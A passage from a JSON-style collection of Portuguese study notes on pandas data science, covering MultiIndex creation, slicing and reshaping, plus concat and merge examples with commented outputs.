"HIERARQUIA##########################################################\n####################################################################\n\nimport pandas as pd\nimport numpy as np\n'''\nTemos tuplas como \u00edndices, fazemos o pd.Series normalmente\npor\u00e9m agora o \u00edndice \u00e9 composto da seguinte forma:\n('California', 2000), ('California', 2010). \nDessa forma cada \u00edndice duplo tem o seu valor.\nusamos o MultIndex(levels=[['California', 'New York', 'Texas'],[2000, 2010]],]\nlabels=[[0, 0, 1, 1, 2, 2], [0, 1, 0, 1, 0, 1]]), aparece assim:\nCalifornia 2000 33871648\n           2010 37253956\nNew York   2000 18976457\n           2010 19378102\nTexas      2000 20851820\n           2010 25145561\n\nent\u00e3o podemos usar mult_pop[:, 2010], Todas as linhas da coluna\n2010          \n'''\n\nindex = [('California', 2000), ('California', 2010),\n('New York', 2000), ('New York', 2010), \n('Texas', 2000), ('Texas', 2010)]\n\npopulations = [33871648, 37253956, \n\t18976457, 193378102,\n\t20851820, 25145561]\n\npop = pd.Series(populations, index=index)\n\nmultindex = pd.MultiIndex.from_tuples(index)\n\nmult_pop = pop.reindex(multindex)\n\nprint(mult_pop)\nprint(mult_pop[:, 2010])\n\n\nMULTIINDEX - PEGANDO DE SERIES E PASSANDO PARA DATAFRAME ##################\n######################################################################\nimport pandas as pd\nimport numpy as np\n'''\n1# Fazemos um pd.Series usando os \u00edndices duplos em tuplas.\n2# a# estamos fazenod o multiindex das tuplas:\n MultiIndex(levels=[['California', 'New York', 'Texas'], [2000, 2010]],\n labels=[[0, 0, 1, 1, 2, 2], [0, 1, 0, 1, 0, 1]])\n \n\tb# Estamos reindexando o pd.Series e armazendo o resultado em uma nova\n\tvari\u00e1vel.\n\t\n\tc# Estamos deixando o pd.Series novo com o formato de um DataFrame\n\n3# Estamos fazendo um DataFrame onde a popula\u00e7\u00e3o vai ter nome de total,\ne passamos os valores de 'under18' na cria\u00e7\u00e3o do DataFrame\n\n4# Estamos criando uma colunas no DataFrame que usamos o multiindex\ne fazendo c\u00e1culos\n\n'''\n\nindex = [('California', 2000), ('California', 2010),\n('New York', 2000), ('New York', 2010), \n('Texas', 2000), ('Texas', 2010)]\n\npopulations = [33871648, 37253956, \n\t18976457, 193378102,\n\t20851820, 25145561]\n#1\npop = pd.Series(populations, index=index)\n\n#2\nmultiindex = pd.MultiIndex.from_tuples(index) #a\nmult_pop = pop.reindex(multiindex) #b\npop_df = mult_pop.unstack() #c\n\n#3\npop_df = pd.DataFrame({'Total': mult_pop,\n\t'under18':[9267089, 9284094,\n\t4687374, 4318033,\n\t5906301, 6878014]})\n\t\nprint(pop_df)\n\n#4\npop_df['Densidade'] = pop_df['under18'] / pop_df['Total']\n\nprint(pop_df)\n\n\n\n", "categoria": "python ciencia de dados handbook"}, "Pandas - MultIndex - M\u00e9todos de cria\u00e7\u00e3o": {"categoria": "python ciencia de dados handbook", "codigo": "M\u00c9TODOS DE CRIA\u00c7\u00c3O DO MULTINDEX #####################################\n###################################################################\nimport pandas as pd\nimport numpy as np\n\n'''\nPodemos criar o Multiindex de v\u00e1rias formas:\n1# Passando uma matriz, os \u00edndeces duplos j\u00e1 separados, a 1, a 2, b 1, b 2,\nem seguida o nome das colunas\n\n2# Fazendo um dicion\u00e1rio onde das chaves sejam as \u00edndices duplos e o valor\nseja o valor do \u00edndice. No segundo exemplo, \u00e9 um Series, ou seja, n\u00e3o um\ndata frame.\n\n\n'''\n\n\n#1\ndf = pd.DataFrame(np.random.rand(4, 2),\n\tindex=[['a', 'a', 'b', 'b'],[1, 2, 1, 2]],\n\tcolumns=['date1', 'date2']\n\t)\n\n#2\ndata = {('California', 2000): 33871648,\n\t('California', 2010): 37253956,\n\t('Texas', 2000): 20851820,\n\t('Texas', 2010): 25145561,\n\t('New York', 2000): 18976457,\n\t('New York', 2010): 19378102}\n\t\ndata_fin = pd.Series(data)\nprint(data_fin)\n\n\nM\u00c9TODOS EXPL\u00cdCITOS DE CRIA\u00c7\u00c3O ###########################################\n######################################################################\nimport pandas as pd\nimport numpy as np\n\n\nmulti_index0 = pd.MultiIndex.from_arrays([['a', 'a', 'b', 'b'], [1, 2, 1, 2]])\n'''MultiIndex(levels=[['a', 'b'], [1, 2]],\n labels=[[0, 0, 1, 1], [0, 1, 0, 1]])'''\n \nmulti_index1 = pd.MultiIndex.from_tuples([('a', 1), ('a', 2), ('b', 1), ('b', 2)])\n'''MultiIndex(levels=[['a', 'b'], [1, 2]],\n labels=[[0, 0, 1, 1], [0, 1, 0, 1]])'''\n \n multi_index2 = pd.MultiIndex.from_product([['a', 'b'], [1, 2]])\n '''MultiIndex(levels=[['a', 'b'], [1, 2]],\n labels=[[0, 0, 1, 1], [0, 1, 0, 1]])'''\n \n multi_index3 = pd.MultiIndex(levels=[['a', 'b'], [1, 2]],\n\tcodes=[[0, 0, 1, 1], [0, 1, 0, 1]])\n'''MultiIndex(levels=[['a', 'b'], [1, 2]],\n labels=[[0, 0, 1, 1], [0, 1, 0, 1]])'''\n\nmulti_index4 = pd.MultiIndex(levels=[['a', 'b'], [1, 2]],\n labels=[[0, 0, 1, 1], [0, 1, 0, 1]])\n '''MultiIndex(levels=[['a', 'b'], [1, 2]],\n labels=[[0, 0, 1, 1], [0, 1, 0, 1]])'''\n\nMULTIINDEX LEVELS NAME ##############################################\n###################################################################\npop.index.names = ['state', 'year']\n pop\n state      year\n California 2000 33871648\n            2010 37253956\n New York   2000 18976457\n            2010 19378102\n Texas      2000 20851820\n            2010 25145561\n dtype: int64\n\n\nMULTIINDEX PARA COLUNAS #############################################\n###################################################################\nimport pandas as pd\nimport numpy as np\n\n'''\n1# Fazendo o multiindex, ou seja com os \u00edndices duplos, \n2013 - 1\n2013 - 2\n2014 - 1\n2014 - 2\n\n2# Fazendo o multiindex, ou seja com os \u00edndices duplos, \ns\u00f3 que agora para as colunas:\nBob HR\nBob Temp\nGuido HR\nGuido Temp]\n....\n\n3# Os dados est\u00e3o em uma matriz 4, 6.\n\n4# Fazendo o DataFrame usando o pandas, passamos os dados\nem formato de matriz (4, 6), passamos os \u00edndices e as colunas.\n\n'''\n#1\nindex = pd.MultiIndex.from_product([[2013, 2014], [1, 2]],\n\tnames=['years', 'visits'])\n\n#2\t\ncolumns = pd.MultiIndex.from_product([['Bob', 'Guido', 'Sue'], ['HR', 'Temp']],\n\tnames=['subject', 'type'])\n\t\n#3\ndata = np.round(np.random.randn(4, 6), 1)\n\n#4\ndata_frame = pd.DataFrame(data, index=index, columns=columns)\n\nprint(data_frame)\n\nprint(data_frame['Guido']['HR'])\n\t\n\n\nLENDO ARQUIVO MULTIINDEX QUE FOI SALVO COM CSV ###########################\n######################################################################\n\n'''\n- header[0, 1] indica que as duas primeiras linhas ser\u00e3o para a construi\u00e7\u00e3o dos \u00edndices de colunas\n\n- index_col=[0, 1] indica que a coluna 0 e 1 ser\u00e1 usada para a indexa\u00e7\u00e3o de 2 n\u00edveis, years, visits\n\n'''\n\n\n,,Bob,Bob,Guido,Guido,Sue,Sue\n,,HR,Temp,HR,Temp,HR,Temp\nyears,visits,,,,,,\n2013,1,-0.3,-2.1,-0.3,2.1,0.6,-0.9\n2013,2,-0.9,-0.2,0.8,-0.8,-1.5,1.2\n2014,1,-0.2,1.6,-1.6,0.5,-1.2,-0.2\n2014,2,1.5,-1.7,1.0,1.5,0.4,-1.1\n\n\ndf = pd.read_csv('dataframe.csv', index_col=[0, 1], header=[0, 1])"}, "Pandas - MultIndex - Indexando e fatiando": {"codigo": "import pandas as pd\nimport numpy as np\n\nindex = [('California', 2000), ('California', 2010),\n\t('New York', 2000), ('New York', 2010),\n\t('Texas', 2000), ('Texas', 2010)]\n\t\npopulations = [33871648,\n\t37253956,\n\t18976457,\n\t19378102,\n\t20851820,\n\t25145561]\n\t\npop = pd.Series(populations, index=index)\n\nmultiindex = pd.MultiIndex.from_tuples(index)\nmult_pop = pop.reindex(multiindex)\n\nprint(mult_pop['California', 2000])\nprint(mult_pop['California'])\nprint(mult_pop[:, 2000])\nprint(mult_pop[mult_pop > 22000000])\nprint(mult_pop[['California', 'Texas']]) #Apenas california e texas\n\nindex = pd.MultiIndex.from_product([[2013, 2014], [1, 2]],\n\tnames=['year', 'visit'])\n\n\ncolumns = pd.MultiIndex.from_product([['Bob', 'Guido', 'Sue'], ['HR', 'Temp']],\n\tnames=['subject', 'type'])\n# mock some data\n\n\ndata = np.round(np.random.randn(4, 6), 1)\ndata[:, ::2] *= 10\ndata += 37\n\n\n# create the DataFrame\nhealth_data = pd.DataFrame(data, index=index, columns=columns)\nprint(health_data['Guido', 'HR'])\n\nprint(health_data.iloc[:2, :2])\nprint(health_data.loc[:, ('Bob', 'HR')])\n#print(health_data.loc[(:, 1), (:, 'HR')])\nidx = pd.IndexSlice\n\nprint(health_data.loc[idx[:, 1], idx[:, 'HR']])\n#Todos os anos 1 e somente HR\n", "categoria": "python ciencia de dados handbook"}, "Pandas - MultiIndex  - Reorganizando multiindeces": {"codigo": "ORDENANDO E DESORDENANDO MULTIINDEC ###################################\n#######################################################################\nimport pandas as pd\nimport numpy as np\n\n'''\nFazendo um pd.Series() em que os \u00edndices est\u00e3o em fora de ordem \nlexogr\u00e1ficas, 'a', 'c', 'b', ou seja quando tentarmos fatiar de \n['a' : 'b'] 'a' at\u00e9 'b' um erro vai acontecer, ent\u00e3o usamos \no sort_index() que ordena os \u00edndices para que agora sim possamos\nfatiar o dataframe sem erros\n\n\n'''\nindex = pd.MultiIndex.from_product([['a', 'c', 'b'], [1, 2]])\n\ndata = pd.Series(np.random.rand(6), index=index)\ndata.index.names = ['char', 'int']\nprint(data)\n\ndata = data.sort_index()\nprint(data)\n\nprint(data['a' : 'b'])\n\n\nSTACKING AND UNSTACKING INDICES############################################\n#########################################################################\nimport pandas as pd\nimport numpy as np\n\ndata = {('California', 2000): 33871648,\n ('California', 2010): 37253956,\n ('Texas', 2000): 20851820,\n ('Texas', 2010): 25145561,\n ('New York', 2000): 18976457,\n ('New York', 2010): 19378102}\n \npop = pd.Series(data)\nprint(pop.unstack(level=0))\nprint(pop.unstack(level=1))\nprint(pop.unstack().stack())\n\n\nINDEX SETTING OU RESETTIN - DADOS BRUTOS COM \u00cdNDICES D\u00daPLOS ##################\n#######################################################################\n\nimport pandas as pd\nimport numpy as np\n'''\nPegamos os dados e fizemos um multiindice, depois resetamos o multiindice,\nisso significa que cada linha vai ter o \u00edndice d\u00faplo expl\u00edcito, passamos\ne o set_index \u00e9 para quando recebermos a tabela onde a primeira coluna \nde \u00edndeces e a seguda sejam explicitamente \u00edndices duplos\n\n'''\n\n\n\n\nindex = [('California', 2000), ('California', 2010),\n('New York', 2000), ('New York', 2010),\n('Texas', 2000), ('Texas', 2010)]\n\npopulations = [33871648, 37253956, \n\t18976457, 193378102,\n\t20851820, 25145561]\n\npop = pd.Series(populations, index=index)\n\nmultiindex = pd.MultiIndex.from_tuples(index)\nmult_pop = pop.reindex(multiindex)\nmult_pop.index.names = ['state', 'years']\n\nprint(mult_pop)\n\npop_flat = mult_pop.reset_index(name='population')\nprint(pop_flat)\nprint(pop_flat.set_index(['state', 'years']))\n", "categoria": "python ciencia de dados handbook"}, "Pandas - MultiIndex  - Agrega\u00e7\u00e3o de dados em multiindices groupby com m\u00e9dia": {"codigo": "import pandas as pd\nimport numpy as np\n\n\nindex = pd.MultiIndex.from_product([[2013, 2014], [1, 2]],\n\tnames=['years', 'visits'])\n\t\ncolumns = pd.MultiIndex.from_product([['Bob', 'Guido', 'Sue'], ['HR', 'Temp']],\n\tnames=['subject', 'type'])\n\t\ndata = np.round(np.random.randn(4, 6), 1)\n\ndata_frame = pd.DataFrame(data, index=index, columns=columns)\nprint(data_frame)\n\ndata_media = data_frame.groupby(level='years').mean()\ndata_media1 = data_frame.groupby(axis=1, level='type').mean()\nprint(data_media1)\n", "categoria": "python ciencia de dados handbook"}, "Pandas - Combinando Datasets - Concat and Append": {"categoria": "python ciencia de dados handbook", "codigo": "PD.CONCAT([DADAFRAME_1, DATAFRAME_2]) ################################\n###################################################################\nimport pandas as pd\nimport numpy as np\n'''\n\tpd.concat(objs, axis=0, join='outer', join_axes=None, ignore_index=False,\n\tKeys=None, levels=None, names=None, verify_integrity=False, copy=True)\n'''\ndef make_df(colunas, indices):\n\tdata = {c: [str(c) + str(i) for i in indices] for c in colunas}\n\treturn pd.DataFrame(data, indices)\n\n\nser1 = pd.Series(['A', 'B', 'C'], index=[1, 2, 3])\n'''\n1    A\n2    B\n3    C\n'''\nser2 = pd.Series(['D', 'E', 'F'], index=[4, 5, 6])\n'''\n4    D\n5    E\n6    F\n'''\nconcat = pd.concat([ser1, ser2])\n'''\n1    A\n2    B\n3    C\n4    D\n5    E\n6    F\n'''\nprint(ser1)\nprint(ser2)\nprint(concat)\n\ndata_frame_1 = make_df('AB', [1, 2])\n'''\n    A   B\n1  A1  B1\n2  A2  B2\n'''\ndata_frame_2 = make_df('AB', [2, 3])\n'''\n    A   B\n2  A2  B2\n3  A3  B3\n'''\nconcat1 = pd.concat([data_frame_1, data_frame_2])\n'''\n    A   B\n1  A1  B1\n2  A2  B2\n2  A2  B2\n3  A3  B3\n'''\n\nprint(data_frame_1)\nprint(data_frame_2)\nprint(concat1)\n\ndata_frame_3 = make_df('AB', [0, 1])\n'''\n    A   B\n0  A0  B0\n1  A1  B1\n'''\ndata_frame_4 = make_df('CD', [0, 1])\n'''\n    C   D\n0  C0  D0\n1  C1  D1\n'''\nconcat2 = pd.concat([data_frame_3, data_frame_4], axis=1)\n'''\n    A   B   C   D\n0  A0  B0  C0  D0\n1  A1  B1  C1  D1\n\n'''\n\nprint(data_frame_3)\nprint(data_frame_4)\nprint(concat2)\n\nCONCATENANDO USANDO JOIN='INNER' OU JOIN='OUTER SOMENTE OU TUDO ######\n####################################################################\nimport pandas as pd\nimport numpy as np\n\n\n'''\n\tpd.concat(objs, axis=0, join='outer', join_axes=None, ignore_index=False,\n\tKeys=None, levels=None, names=None, verify_integrity=False, copy=True)\n'''\ndef make_df(colunas, indices):\n\tdata = {c: [str(c) + str(i) for i in indices] for c in colunas}\n\treturn pd.DataFrame(data, indices)\n\ndata_frame5 = make_df('ABC', [1, 2])\n'''\n    A   B   C\n1  A1  B1  C1\n2  A2  B2  C2\n'''\ndata_frame6 = make_df('BCD', [3, 4])\n'''\n    B   C   D\n3  B3  C3  D3\n4  B4  C4  D4\n'''\n'''\nTemos duas tabelas onde tem apenas duas colunas em comum, ou seja, duas\nbases de dados diferentes mas com alguns dados em comum, \nO JOIN='INNER' FAZ A CONCATENA\u00c7\u00c3O APENAS PARA AS COLUNAS QUE S\u00c3O COMUNS\n\nO JOIN='OUTER' COMBINA TODOS OS DADOS DOS DATAFRAMES, ONDE N\u00c3O PUDER JUNTAS\nSER\u00c1 NAN, O AXIS=1 DIZ QUE A CONCATENA\u00c7\u00c3O DEVE SER VERTICAL, COLUNAS\n\n\njoin='inner': Mant\u00e9m apenas as colunas ou \u00edndices presentes em ambos os DataFrames.\njoin='outer': Inclui todas as colunas ou \u00edndices, preenchendo com NaN onde os dados est\u00e3o ausentes.\naxis=0: Concatena DataFrames verticalmente (empilha os DataFrames).\naxis=1: Concatena DataFrames horizontalmente (anexa colunas).\n\n'''\nprint(pd.concat([data_frame5, data_frame6], join='inner'))\nprint(pd.concat([data_frame5, data_frame6], axis=1, join='outer'))\n"}, "Pandas - Combinando DataSets - pd.merge() one to one, one to many, many to many": {"codigo": "PD.MERGE() ONE TO ONE ################################################\n###################################################################\nimport pandas as pd\nimport numpy as np\n\n'''\nA fun\u00e7\u00e3o pd.merge() identifica que nos dois dataframes existe uma coluna\nchamada employee e o resultado \u00e9 um novo dataframe ligado pelas chaves\nque s\u00e3o os valores das colunas em comum\n'''\ndata_frame_1 = pd.DataFrame({'employee': ['Bob', 'Jake', 'Lisa', 'Sue'],\n\t'group': ['Accounting', 'Enginnering', 'Enginnering', 'HR']})\n\ndata_frame_2 = pd.DataFrame({'employee': ['Lisa', 'Bob', 'Jake', 'Sue'],\n\t'hire_date': [2004, 2008, 2012, 2014]})\nprint(data_frame_1, data_frame_2)\nprint('\\n')\n\ndata_frame_3 = pd.merge(data_frame_1, data_frame_2)\nprint(data_frame_3)\n\n\nPD.MERGE() MANY TO ONE ###################################################\n######################################################################\nimport pandas as pd\nimport numpy as np\n\n'''\nA Fun\u00e7\u00e3o pd.merge() tem  uma coluna no meio da tabela chamada 'group', \nem outra tabela tem essa mesma coluna chamada de tamb\u00e9m 'group', \nent\u00e3o o 'group' passar\u00e1 a ser um s\u00f3 e os valores do segundo ser\u00e3o \nadicionados onde as colunas tem em comum\n'''\ndata_frame_1 = pd.DataFrame({'employee': ['Bob', 'Jake', 'Lisa', 'Sue'],\n\t'group': ['Accounting', 'Engineering', 'Engineering', 'HR']})\n'''\n  employee        group\n0      Bob   Accounting\n1     Jake  Enginnering\n2     Lisa  Enginnering\n'''\ndata_frame_2 = pd.DataFrame({'employee': ['Lisa', 'Bob', 'Jake', 'Sue'],\n\t'hire_date': [2004, 2008, 2012, 2014]})\n'''\n  employee  hire_date\n0     Lisa       2004\n1      Bob       2008\n2     Jake       2012\n3      Sue       2014\n'''\n\ndata_frame_3 = pd.merge(data_frame_1, data_frame_2)\n'''\n  employee        group  hire_date\n0      Bob   Accounting       2008\n1     Jake  Enginnering       2012\n2     Lisa  Enginnering       2004\n3      Sue           HR       2014\n'''\ndata_frame_4 = pd.DataFrame({'group': ['Accounting', 'Engineering', 'HR'],\n\t'supervisor': ['Carly', 'Guido', 'Steve']})\n'''\n         group supervisor\n0   Accounting      Carly\n1  Engineering      Guido\n2           HR      Steve\n'''\n\ndata_frame_result = pd.merge(data_frame_3, data_frame_4)\nprint(data_frame_result)\n\n\nPD.MERGE() MANY TO MANY ##############################################\n####################################################################\nimport pandas as pd\nimport numpy as np\n\n'''\nA fun\u00e7\u00e3o pd.merge() muitos para muitos duplica a coluna n\u00e3o especificada,\npor a coluna que foi adicionada tem mais de um valor para cada conex\u00e3o, \nou seja, samuel, engenheiro, matematica | linguagem \ndessa forma vai ficar \nsamuel engenheiro matematica\nsamuel engenheiro linguagem\n'''\ndata_frame_1 = pd.DataFrame({'employee': ['Bob', 'Jake', 'Lisa', 'Sue'],\n\t'group': ['Accounting', 'Engineering', 'Engineering', 'HR']})\n'''\n  employee        group\n0      Bob   Accounting\n1     Jake  Enginnering\n2     Lisa  Enginnering\n'''\ndata_frame_2 = pd.DataFrame({'employee': ['Lisa', 'Bob', 'Jake', 'Sue'],\n\t'hire_date': [2004, 2008, 2012, 2014]})\n'''\n  employee  hire_date\n0     Lisa       2004\n1      Bob       2008\n2     Jake       2012\n3      Sue       2014\n'''\n\ndata_frame_3 = pd.merge(data_frame_1, data_frame_2)\n'''\n  employee        group  hire_date\n0      Bob   Accounting       2008\n1     Jake  Enginnering       2012\n2     Lisa  Enginnering       2004\n3      Sue           HR       2014\n'''\ndata_frame_4 = pd.DataFrame({'group': ['Accounting', 'Engineering', 'HR'],\n\t'supervisor': ['Carly', 'Guido', 'Steve']})\n'''\n         group supervisor\n0   Accounting      Carly\n1  Engineering      Guido\n2           HR      Steve\n'''\n\ndata_frame_result = pd.merge(data_frame_3, data_frame_4)\n'''\n  employee        group  hire_date supervisor\n0      Bob   Accounting       2008      Carly\n1     Jake  Engineering       2012      Guido\n2     Lisa  Engineering       2004      Guido\n3      Sue           HR       2014      Steve\n'''\n\ndata_frame_5 = pd.DataFrame({'group': ['Accounting', 'Accounting', \n\t'Engineering', 'Engineering', 'HR', 'HR'],\n\t'skill': ['math', 'spreadsheets', 'coding', 'linux',\n\t'spredsheets', 'organization']})\n'''\n         group         skill\n0   Accounting          math\n1   Accounting  spreadsheets\n2  Engineering        coding\n3  Engineering         linux\n4           HR   spredsheets\n5           HR  organization\n'''\n\n\ndata_frame_result_1 = pd.merge(data_frame_1, data_frame_5)\n'''\n  employee        group         skill\n0      Bob   Accounting          math\n1      Bob   Accounting  spreadsheets\n2     Jake  Engineering        coding\n3     Jake  Engineering         linux\n4     Lisa  Engineering        coding\n5     Lisa  Engineering         linux\n6      Sue           HR   spredsheets\n7      Sue           HR  organization\n'''\n\t\n\n", "categoria": "python ciencia de dados handbook"}, "Pandas - Combinando DataSets - especifica\u00e7\u00e3o da chave merge": {"categoria": "python ciencia de dados handbook", "codigo": "THE ONE KEYWORD #########################################################\n########################################################################\nimport pandas as pd\nimport numpy as np\n\n'''\nConseguimos especificar qual coluna queremos que seja feito.\n'''\ndata_frame_1 = pd.DataFrame({'employee': ['Bob', 'Jake', 'Lisa', 'Sue'],\n\t'group': ['Accounting', 'Engineering', 'Engineering', 'HR']})\n'''\n  employee        group\n0      Bob   Accounting\n1     Jake  Enginnering\n2     Lisa  Enginnering\n'''\ndata_frame_2 = pd.DataFrame({'employee': ['Lisa', 'Bob', 'Jake', 'Sue'],\n\t'hire_date': [2004, 2008, 2012, 2014]})\n'''\n  employee  hire_date\n0     Lisa       2004\n1      Bob       2008\n2     Jake       2012\n3      Sue       2014\n'''\n\ndata_frame_result = pd.merge(data_frame_1, data_frame_2, on='employee')\n'''\n  employee        group  hire_date\n0      Bob   Accounting       2008\n1     Jake  Engineering       2012\n2     Lisa  Engineering       2004\n3      Sue           HR       2014\n'''\n\nTHE LEFT_ON EN RIGHT_ON KEYWORDS######################################\n#####################################################################\nimport pandas as pd\nimport numpy as np\n\n'''\nEspecificamos qual coluna do lado direito queremos pegar do lado esquerdo\ne fazer a mesclagem, podemos, nesse caso, pelo fato das colunas n\u00e3o terem\nnomes iguais, o dataframe vem com duas colunas a mais, a coluna de mesclagem\ne os valores. Podemos tamb\u00e9m tirar a coluna que usamos para mesclar\n'''\ndata_frame_1 = pd.DataFrame({'employee': ['Bob', 'Jake', 'Lisa', 'Sue'],\n\t'group': ['Accounting', 'Engineering', 'Engineering', 'HR']})\n'''\n  employee        group\n0      Bob   Accounting\n1     Jake  Enginnering\n2     Lisa  Enginnering\n'''\ndata_frame_2 = pd.DataFrame({'employee': ['Lisa', 'Bob', 'Jake', 'Sue'],\n\t'hire_date': [2004, 2008, 2012, 2014]})\n'''\n  employee  hire_date\n0     Lisa       2004\n1      Bob       2008\n2     Jake       2012\n3      Sue       2014\n'''\n\ndata_frame_3 = pd.DataFrame({'name': ['Bob', 'Jake', 'Lisa', 'Sue'],\n\t'salary': [70000, 80000, 120000, 90000]})\n\t\ndata_frame_result = pd.merge(data_frame_2, data_frame_3, left_on='employee',\nright_on='name')\n'''\n  employee  hire_date  name  salary\n0     Lisa       2004  Lisa  120000\n1      Bob       2008   Bob   70000\n2     Jake       2012  Jake   80000\n3      Sue       2014   Sue   90000\n'''\n\ndata_frame_result_sn = pd.merge(data_frame_2, data_frame_3, left_on='employee',\nright_on='name').drop('name', axis=1)\n'''\n  employee  hire_date  salary\n0     Lisa       2004  120000\n1      Bob       2008   70000\n2     Jake       2012   80000\n3      Sue       2014   90000\n'''\n\nTHE LEFT_INDEX AND RIGHT_INDEX KEYWORDS###################################\n######################################################################\n\nimport pandas as pd\nimport numpy as np\n\n'''\nAgora estamos juntando os dois dataframes atrav\u00e9s do indice, nesse caso\ncomo estamos juntando atrav\u00e9s do \u00edndice, podemos usar o join() que \nvai dar no mesmo resultado\n'''\ndata_frame_1 = pd.DataFrame({'employee': ['Bob', 'Jake', 'Lisa', 'Sue'],\n\t'group': ['Accounting', 'Engineering', 'Engineering', 'HR']})\n'''\n  employee        group\n0      Bob   Accounting\n1     Jake  Enginnering\n2     Lisa  Enginnering\n'''\ndata_frame_2 = pd.DataFrame({'employee': ['Lisa', 'Bob', 'Jake', 'Sue'],\n\t'hire_date': [2004, 2008, 2012, 2014]})\n'''\n  employee  hire_date\n0     Lisa       2004\n1      Bob       2008\n2     Jake       2012\n3      Sue       2014\n'''\ndata_frame_1a = data_frame_1.set_index('employee')\n#data_frame_1.set_index('employee', inplace=True) modificar o df original\n'''\n                group\nemployee\nBob        Accounting\nJake      Engineering\nLisa      Engineering\nSue                HR\n'''\ndata_frame_2a = data_frame_2.set_index('employee')\n'''\n          hire_date\nemployee\nLisa           2004\nBob            2008\nJake           2012\nSue            2014\n'''\n\ndata_frame_result = pd.merge(data_frame_1a, data_frame_2a, left_index=True,\nright_index=True)\n'''\n                group  hire_date\nemployee\nBob        Accounting       2008\nJake      Engineering       2012\nLisa      Engineering       2004\nSue                HR       2014\n'''\n\ndata_frame_result_j = data_frame_1a.join(data_frame_2a)\n'''\n                group  hire_date\nemployee\nBob        Accounting       2008\nJake      Engineering       2012\nLisa      Engineering       2004\nSue                HR       2014\n'''\n\n\n\n"}, "Pandas - Combinando DataSets - especificando conjunto aritim\u00e9ticos para jun\u00e7\u00f5es": {"codigo": "import pandas as pd\nimport numpy as np\n'''\nQuando usamos o pd.merge() o dataframe resultate ser\u00e1 apenas onde os valores\nest\u00e3o presentes nas duas colunas, ou seja, samuel valor1 | samuel valor2\nmas podemos usar o 'how' e especificar, usando 'outer' pegamos todas as \ncombina\u00e7\u00f5es, usando o 'left ou  right' pegamos apenas os nomes que est\u00e3o\ndo lado que selecionamos.\n'''\n\ndata_frame_6 = pd.DataFrame({'name': ['Peter', 'Paul', 'Mary'],\n\t'food': ['fish', 'beans', 'bread']})\n'''\n    name   food\n0  Peter   fish\n1   Paul  beans\n2   Mary  bread\n'''\n\t\ndata_frame_7 = pd.DataFrame({'name': ['Mary', 'Joseph'],\n\t'drink': ['wine', 'beer']}, columns=['name', 'drink'])\n'''\n     name drink\n0    Mary  wine\n1  Joseph  beer\n'''\t\ndata_frame_result = pd.merge(data_frame_6, data_frame_7)\n'''\n   name   food drink\n0  Mary  bread  wine\n'''\n\ndata_frame_result1 = pd.merge(data_frame_6, data_frame_7, how='outer')\n'''\n     name   food drink\n0  Joseph    NaN  beer\n1    Mary  bread  wine\n2    Paul  beans   NaN\n3   Peter   fish   NaN\n'''\n\ndata_frame_result2 = pd.merge(data_frame_6, data_frame_7, how='left')\nprint(data_frame_result2)\n", "categoria": "python ciencia de dados handbook"}, "Pandas - Combinando DataSets - conflitos de nomes de colunas em tabelas": {"codigo": "import pandas as pd\nimport numpy as np\n'''\n\u00c0s vezes recebemos tabelas que tem o mesmo nome de colunas, mas n\u00e3o tem os\nmesmo tipos de dados, ent\u00e3o precisamos resulfixar as colunas para que fique\nmais f\u00e1cil de enxergar de onde est\u00e3o vindo os dados\n''' \n\ndata_frame_8 = pd.DataFrame({'name': ['Bob', 'Jake', 'Lisa', 'Sue'],\n\t'rank': [1, 2, 3, 4]})\n'''\n   name  rank\n0   Bob     1\n1  Jake     2\n2  Lisa     3\n3   Sue     4\n'''\ndata_frame_9 = pd.DataFrame({'name': ['Bob', 'Jake', 'Lisa', 'Sue'],\n\t'rank': [3, 1, 4, 2]})\n'''\n   name  rank\n0   Bob     3\n1  Jake     1\n2  Lisa     4\n3   Sue     2\n'''\t\ndata_frame_result = pd.merge(data_frame_8, data_frame_9, on='name')\n'''\n   name  rank_x  rank_y\n0   Bob       1       3\n1  Jake       2       1\n2  Lisa       3       4\n3   Sue       4       2\n'''\n\ndata_frame_result1 = pd.merge(data_frame_8, data_frame_9, on='name', suffixes=['_L', '_R'])\n'''\n   name  rank_L  rank_R\n0   Bob       1       3\n1  Jake       2       1\n2  Lisa       3       4\n3   Sue       4       2\n'''\n\n", "categoria": "python ciencia de dados handbook"}, "Pandas - Combinando DataSets - Atividade ": {"categoria": "python ciencia de dados handbook", "codigo": "import pandas as pd\nimport numpy as np\n\npd.set_option('display.max_rows', None)\n\npop = pd.read_csv('state-population.csv')\n'''state/region | ages | year | population'''\nareas = pd.read_csv('state-areas.csv')\n'''state | area'''\nabbrevs = pd.read_csv('state-abbrevs.csv')\n'''state | abbreviation'''\n\n'''\n1# Juntando o dataframe pop e abbrevs, o nome das colunas nos dataframes n\u00e3o s\u00e3o iguais\npor isso temos que usar o left_on|right_on, o 'how' diz que est\u00e9 o valroes nulos ser\u00e3o\nconsiderados\n\n2# Vendo quais colunas tem valores nulos em seu conte\u00fado\n\n3# Monstrando onde os valores nulos est\u00e3o, evidenciando o dataframe.\n\n4# mostra qual nome da linha est\u00e3o os valores nulos\n\n5# Seleciona as linhas que sejam iguais == e a coluna 'state', o que supre a filtragem\no valor ser\u00e1 mudado para 'Puerto Rico'\n\n6# Juntando o dataframe 'merged' e 'area', como na tabela as colunas que vamos juntar \nas colunas tem o mesmo nome, n\u00e3o precisamos usar o left_on|right_on\n\n7# Vendo quais colunas tem valores nulos em seu conte\u00fado\n\n8# Monstrando qual o nome da linha nas colunas 'state' e 'area' \u00e9 nulo\n\n9# Deleta todas as linhas que tem algo nulo, inplace significa que a altera\u00e7\u00e3o\nser\u00e1 feita no dataframe original, caso seja False ou inexiste cria um novo \ndataframe armazenado em uma vari\u00e1vel.\n\n10# Fazendo uma consulta no dataframe, mostra todas as colunas, mas que \nsuprem os filtros colocados.\n\n11# Transforma a coluna 'state' em \u00edndice do dataframe\n\n12# definimos o nomo dataframe que tenha apenas os \u00edndices e o resultado de densidade\n\n13# Ordanamos o valores da colunas, ascending=True significa que queromos do \nmaior para o menor\n\n14#  podemos ver os \u00faltimos itens do dataframe.\n\n'''\n\n#1\nmerged = pd.merge(pop, abbrevs, how='outer', left_on='state/region',\nright_on='abbreviation').drop(['abbreviation'], axis=1)\n#print(merged)\n\n#2\ncolunas_nulas = merged.isnull().any()\n# state | population\n\n#3\nvalores_nulos = merged[merged['population'].isnull()]\n# PR | USA | population (PR)\n\n#4\nmerged.loc[merged['state'].isnull(), 'state/region'].unique()\n\n#5\nmerged.loc[merged['state/region']=='PR', 'state'] = 'Puerto Rico'\nmerged.loc[merged['state/region']=='USA', 'state'] = 'United Stades'\n\n#print(merged.isnull().any())\n#6\nfinal = pd.merge(merged, areas, on='state', 